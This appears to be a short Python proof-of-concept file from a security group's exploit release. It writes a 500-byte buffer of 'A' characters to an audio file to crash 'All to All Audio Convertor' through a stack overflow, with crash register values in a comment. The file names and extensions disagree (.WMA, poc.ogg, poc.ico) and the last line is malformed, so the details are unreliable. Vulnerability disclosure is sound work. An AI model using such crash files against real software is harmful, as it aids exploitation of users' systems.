#! /usr/bin/python
#
# All to All Audio Convertor files stack overflow poc
# #############################################################################
# Credit : ItSecTeam
# mail : Bug@ItSecTeam.com
# Web:  WwW.ITSecTeam.com
# Forum: WwW.forum.itsecteam.com
# Special Tanks : PLATEN - M3hr@n.S - B3hz4d - Cdef3nder
# #############################################################################
# EAX 10624DD3 ECX 00000000 EDX 012200C0 EBX 100018A0 ESP 0012E59C EBP 0012EA14
# ESI 0012E5CC EDI 10001010 EIP 100018DA
 
try:
    file=open("poc.ogg",'w')
    Buff = "\x41" *500 # .WMA ...
    file.write( Buff )
    file.close()
    print   ("[+] File created successfully: poc.ico" )
except:
    print "[-] Error cant write file to system\n""""